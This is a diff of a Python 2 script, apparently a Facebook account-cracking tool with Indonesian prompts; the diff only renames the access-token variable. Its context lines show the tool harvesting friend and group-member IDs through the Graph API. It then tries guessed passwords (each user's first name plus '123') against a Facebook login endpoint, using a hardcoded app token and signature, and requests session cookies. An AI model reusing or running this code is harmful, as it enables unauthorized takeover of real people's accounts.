@@ -140,12 +140,12 @@ def bot_komen():
 def menu():
 	os.system('clear')
 	try:
-		toket=open('login.txt','r').read()
+		Sleep=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
 		os.system('rm -rf login.txt')
 	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		otw = requests.get('https://graph.facebook.com/me?access_token='+Sleep)
 		a = json.loads(otw.text)
 		nama = a['name']
 		id = a['id']
@@ -224,7 +224,7 @@ def pilih_super():
 		print logo
 		print 42*"\033[1;96m="
 		jalan('\033[1;96m[✺] \033[1;93mSEDANG MENGAMBIL ID [•] \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+Sleep)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
@@ -234,7 +234,7 @@ def pilih_super():
 		print 42*"\033[1;96m="
 		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+Sleep)
 			op = json.loads(jok.text)
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
@@ -242,7 +242,7 @@ def pilih_super():
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
 		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+Sleep)
 		z = json.loads(r.text)
 		for i in z['data']:
 			        id.append(s['id'])
@@ -252,7 +252,7 @@ def pilih_super():
 		print 42*"\033[1;96m="
 		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+Sleep)
 			op = json.loads(jok.text)
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
@@ -260,7 +260,7 @@ def pilih_super():
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
 		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+Sleep)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
@@ -270,7 +270,7 @@ def pilih_super():
 		print 42*"\033[1;96m="
 		idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
 		try:
-			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
+			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+Sleep)
 			asw=json.loads(r.text)
 			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
 		except KeyError:
@@ -278,7 +278,7 @@ def pilih_super():
 			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 			super()
 		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+Sleep)
 		s=json.loads(re.text)
 		for p in s['data']:
 			id.append(p['id'])
@@ -316,7 +316,7 @@ def pilih_super():
 		except OSError:
 			pass
 		try:
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+Sleep)
 			b = json.loads(a.text)
 			pass1 = b['first_name']+'123'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
